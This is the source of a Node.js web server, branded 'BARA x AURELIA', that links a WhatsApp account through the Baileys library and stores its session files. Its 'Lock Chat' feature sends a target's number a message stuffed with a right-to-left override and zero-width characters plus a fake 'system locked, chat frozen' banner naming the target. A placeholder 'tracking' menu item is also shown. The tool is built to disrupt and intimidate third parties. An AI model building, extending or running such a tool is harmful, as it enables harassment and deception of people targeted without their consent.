const express = require('express');
const makeWASocket = require('@whiskeysockets/baileys').default;
const {
    useMultiFileAuthState,
    Browsers
} = require('@whiskeysockets/baileys');
const P = require('pino');
const QRCode = require('qrcode');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json({ limit: '1mb' }));

let sock = null;
let currentQR = null;
let pairingCode = null;
let isConnected = false;
let connecting = false;
let currentPhone = null;

const SESSION_DIR = path.join(__dirname, 'sessions');
fs.mkdirSync(SESSION_DIR, { recursive: true });

const htmlContent = `
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>BARA x AURELIA | System</title>
<script src="https://cdn.tailwindcss.com"></script>
<script src="https://unpkg.com/lucide@latest"></script>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
<style>
:root{--primary:#a855f7;--bg:#050505}
*{box-sizing:border-box}
body{margin:0;font-family:Inter,sans-serif;background:var(--bg);color:white;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px;overflow-x:hidden}
.font-tech{font-family:Orbitron,sans-serif}
.grid-bg{position:fixed;inset:0;z-index:-1;background-image:linear-gradient(rgba(168,85,247,.1) 1px,transparent 1px),linear-gradient(90deg,rgba(168,85,247,.1) 1px,transparent 1px);background-size:40px 40px;transform:perspective(500px) rotateX(60deg) translateY(-100px) translateZ(-200px);animation:gridMove 5s linear infinite}
@keyframes gridMove{from{background-position:0 0}to{background-position:0 40px}}
.glass{background:rgba(15,15,25,.88);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,.1);box-shadow:0 8px 32px #000c}
.slide-up{animation:slideUp .4s ease-out}
@keyframes slideUp{from{opacity:0;transform:translateY(15px)}to{opacity:1;transform:translateY(0)}}
.glow-text{text-shadow:0 0 20px #a855f7cc}
.input-neon{background:#0008;border:1px solid #a855f74d;color:white;width:100%;padding:12px 16px;border-radius:12px;outline:none}
.input-neon:focus{border-color:#a855f7;box-shadow:0 0 15px #a855f766}
.hidden{display:none!important}
button{cursor:pointer}
</style>
</head>
<body>
<div class="grid-bg"></div>

<main class="glass w-full max-w-md p-6 sm:p-8 rounded-3xl relative z-10 slide-up">
<header class="text-center mb-8 border-b border-white/10 pb-6">
<h1 class="font-tech text-2xl sm:text-3xl font-black bg-gradient-to-r from-purple-400 to-pink-500 bg-clip-text text-transparent mb-2 glow-text">BARA x AURELIA</h1>
<p class="text-xs text-gray-500 tracking-widest">© 2026 SYSTEM</p>
</header>

<section id="step1">
<h2 class="font-tech text-xl text-center mb-2">Selamat Datang</h2>
<p class="text-sm text-gray-400 text-center mb-6">Masukkan nomor WhatsApp milikmu</p>
<form id="form-phone" class="space-y-4">
<input type="tel" id="input-phone" placeholder="6281234567890" class="input-neon" required>
<button class="w-full bg-gradient-to-r from-purple-600 to-pink-600 font-bold py-3 rounded-xl">Lanjutkan</button>
</form>
</section>

<section id="step2" class="hidden space-y-3">
<h2 class="font-tech text-xl mb-4 text-center">Menu Utama</h2>

<!-- Menu Lacak -->
<button onclick="alert('Fitur Lacak Coming Soon!')" class="w-full flex items-center gap-4 p-4 bg-black/40 border border-white/10 rounded-xl hover:border-purple-500/50 text-left">
<i data-lucide="map-pin" class="text-purple-400"></i>
<div><h3 class="font-bold">Lacak</h3><p class="text-xs text-gray-500">Coming Soon</p></div>
</button>

<!-- Menu Lock Chat -->
<button onclick="goToStep(3)" class="w-full flex items-center gap-4 p-4 bg-black/40 border border-white/10 rounded-xl hover:border-pink-500/50 text-left">
<i data-lucide="lock" class="text-pink-400"></i>
<div><h3 class="font-bold">Lock Chat</h3><p class="text-xs text-gray-500">Kirim efek visual ke target</p></div>
</button>

<!-- Menu Sender -->
<button onclick="goToStep(4)" class="w-full flex items-center gap-4 p-4 bg-black/40 border border-white/10 rounded-xl hover:border-blue-500/50 text-left">
<i data-lucide="send" class="text-blue-400"></i>
<div><h3 class="font-bold">Sender</h3><p class="text-xs text-gray-500">Hubungkan perangkat sendiri</p></div>
</button>
</section>

<section id="step3" class="hidden space-y-4">
<h2 class="font-tech text-xl text-center flex items-center justify-center gap-2">
<i data-lucide="lock" class="text-pink-500"></i> Lock Chat Engine
</h2>
<input type="tel" id="input-target" placeholder="Nomor target (628xxx)" class="input-neon">
<input type="text" id="input-target-name" placeholder="Nama target (opsional)" class="input-neon">
<button id="btn-lock" onclick="sendLockChat()" class="w-full bg-gradient-to-r from-pink-600 to-red-600 font-bold py-3 rounded-xl">Mulai Lock Chat</button>
<button onclick="goToStep(2)" class="w-full text-gray-400 text-sm py-2">Kembali</button>
</section>

<section id="step4" class="hidden space-y-4">
<h2 class="font-tech text-xl text-center flex items-center justify-center gap-2">
<i data-lucide="send" class="text-blue-500"></i> Sender WA
</h2>
<div class="flex bg-black/40 p-1 rounded-xl border border-white/10">
<button id="btn-qr" onclick="setMethod('qr')" class="flex-1 py-2 rounded-lg text-sm bg-blue-600 text-white">QR Code</button>
<button id="btn-pairing" onclick="setMethod('pairing')" class="flex-1 py-2 rounded-lg text-sm text-gray-400">Pairing</button>
</div>
<p id="method-info" class="text-xs text-gray-400">Scan QR menggunakan WhatsApp milikmu.</p>
<button id="btn-connect" onclick="connectWA()" class="w-full bg-gradient-to-r from-blue-600 to-purple-600 font-bold py-3 rounded-xl">Hubungkan Device</button>
<div id="result-box" class="hidden bg-black/70 p-4 rounded-xl border border-white/10 text-center break-words"></div>
<button onclick="goToStep(2)" class="w-full text-gray-400 text-sm py-2">Kembali</button>
</section>
</main>

<script>
lucide.createIcons();
let phone = '';
let method = 'qr';

function goToStep(number) {
    document.querySelectorAll('[id^="step"]').forEach(el => el.classList.add('hidden'));
    document.getElementById('step' + number).classList.remove('hidden');
    lucide.createIcons();
}

document.getElementById('form-phone').addEventListener('submit', event => {
    event.preventDefault();
    phone = document.getElementById('input-phone').value.replace(/\\D/g, '');
    if (!/^62[0-9]{8,13}$/.test(phone)) return alert('Gunakan nomor Indonesia valid (62xxx).');
    goToStep(2);
});

function setMethod(value) {
    method = value;
    document.getElementById('btn-qr').className = 'flex-1 py-2 rounded-lg text-sm ' + (value === 'qr' ? 'bg-blue-600 text-white' : 'text-gray-400');
    document.getElementById('btn-pairing').className = 'flex-1 py-2 rounded-lg text-sm ' + (value === 'pairing' ? 'bg-blue-600 text-white' : 'text-gray-400');
    document.getElementById('method-info').textContent = value === 'qr' ? 'Scan QR menggunakan WhatsApp milikmu.' : 'Kode akan digunakan untuk menautkan perangkat.';
}

async function connectWA() {
    const button = document.getElementById('btn-connect');
    const box = document.getElementById('result-box');
    button.disabled = true;
    button.textContent = 'Menghubungkan...';
    box.classList.remove('hidden');
    box.textContent = 'Meminta koneksi ke server...';

    try {
        const response = await fetch('/api/connect', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({phone, method})
        });
        const data = await response.json();
        if (!response.ok || !data.ok) throw new Error(data.error || 'Koneksi gagal');

        box.replaceChildren();
        if (data.qr) {
            const img = document.createElement('img');
            img.src = data.qr;
            img.className = 'w-48 h-48 mx-auto bg-white p-2 rounded';
            box.append(img);
        } else if (data.code) {
            const title = document.createElement('p');
            title.className = 'text-green-400 mb-2 text-sm';
            title.textContent = 'Kode Pairing:';
            const code = document.createElement('p');
            code.className = 'text-3xl font-black tracking-widest';
            code.textContent = data.code;
            box.append(title, code);
        }
    } catch (error) {
        box.textContent = 'Gagal: ' + error.message;
    } finally {
        button.disabled = false;
        button.textContent = 'Hubungkan Device';
    }
}

async function sendLockChat() {
    const target = document.getElementById('input-target').value.replace(/\\D/g, '');
    const targetName = document.getElementById('input-target-name').value;
    if (!target) return alert("Target kosong!");
    
    const btn = document.getElementById('btn-lock'); 
    btn.innerHTML = 'Mengirim...';
    
    try {
        const res = await fetch('/api/lockchat', { 
            method: 'POST', 
            headers: { 'Content-Type': 'application/json' }, 
            body: JSON.stringify({ target, targetName }) 
        });
        const data = await res.json();
        if (data.ok) alert("✅ " + data.message); 
        else throw new Error(data.error);
    } catch (err) { 
        alert("❌ " + err.message); 
    }
    btn.innerHTML = 'Mulai Lock Chat';
}
</script>
</body>
</html>
`;

app.get('/', (req, res) => res.type('html').send(htmlContent));

app.post('/api/connect', async (req, res) => {
    const { phone, method } = req.body || {};
    if (!/^62[0-9]{8,13}$/.test(phone || '')) return res.status(400).json({ ok: false, error: 'Nomor tidak valid.' });
    if (!['qr', 'pairing'].includes(method)) return res.status(400).json({ ok: false, error: 'Metode tidak valid.' });
    if (connecting || sock) return res.status(409).json({ ok: false, error: 'Socket sudah berjalan.' });

    connecting = true;
    currentPhone = phone;
    currentQR = null;
    pairingCode = null;
    isConnected = false;

    const sessionPath = path.join(SESSION_DIR, 'session_' + phone);

    try {
        fs.mkdirSync(sessionPath, { recursive: true });
        const { state, saveCreds } = await useMultiFileAuthState(sessionPath);

        if (state.creds.registered) {
            connecting = false;
            return res.status(409).json({ ok: false, error: 'Session sudah terdaftar.' });
        }

        const socket = makeWASocket({
            auth: state,
            logger: P({ level: 'warn' }),
            browser: Browsers.macOS('Chrome'),
            printQRInTerminal: false
        });

        sock = socket;
        socket.ev.on('creds.update', saveCreds);

        const result = await new Promise((resolve, reject) => {
            let settled = false;
            let codeRequested = false;

            const finish = (error, value) => {
                if (settled) return;
                settled = true;
                clearTimeout(timeout);
                error ? reject(error) : resolve(value);
            };

            const timeout = setTimeout(() => finish(new Error('Timeout koneksi.')), 45000);

            socket.ev.on('connection.update', async update => {
                const { connection, qr, lastDisconnect } = update;

                if (connection === 'open') {
                    isConnected = true;
                    connecting = false;
                    currentQR = null;
                    pairingCode = null;
                }

                if (connection === 'close') {
                    isConnected = false;
                    connecting = false;
                    if (!settled) finish(new Error('Koneksi terputus.'));
                    if (sock === socket) sock = null;
                }

                if (!qr || settled) return;
                currentQR = qr;

                try {
                    if (method === 'qr') {
                        const dataUrl = await QRCode.toDataURL(qr);
                        finish(null, { ok: true, status: 'qr', qr: dataUrl });
                        return;
                    }
                    if (codeRequested) return;
                    codeRequested = true;
                    const code = await socket.requestPairingCode(phone);
                    pairingCode = code;
                    finish(null, { ok: true, status: 'pairing', code });
                } catch (error) {
                    finish(error);
                }
            });
        });

        return res.json(result);

    } catch (error) {
        connecting = false;
        return res.status(500).json({ ok: false, error: error.message || 'Koneksi gagal.' });
    }
});

app.post('/api/lockchat', async (req, res) => {
    const { target, targetName } = req.body;
    if (!sock || !isConnected) return res.status(400).json({ ok: false, error: 'WA belum konek!' });
    
    try {
        const jid = `${target}@s.whatsapp.net`;
        const rtl = '\u202E', zwsp = '\u200B';
        const payload = `${rtl}${zwsp.repeat(30)}\nJavaScript\n😀😀😀😀😀\n${zwsp.repeat(50)}\n\`\`\`\n[SYSTEM LOCKED BY BARA x AURELIA]\nTarget: ${targetName || target}\nChat dibekukan.\`\`\``;
        await sock.sendMessage(jid, { text: payload });
        return res.json({ ok: true, message: 'Efek Lock Chat terkirim!' });
    } catch (err) { return res.status(500).json({ ok: false, error: err.message }); }
});

const PORT = process.env.PORT || 8000;
app.listen(PORT, () => {
    console.log('====================================');
    console.log('BARA x AURELIA SERVER RUNNING');
    console.log('Port:', PORT);
    console.log('====================================');
});
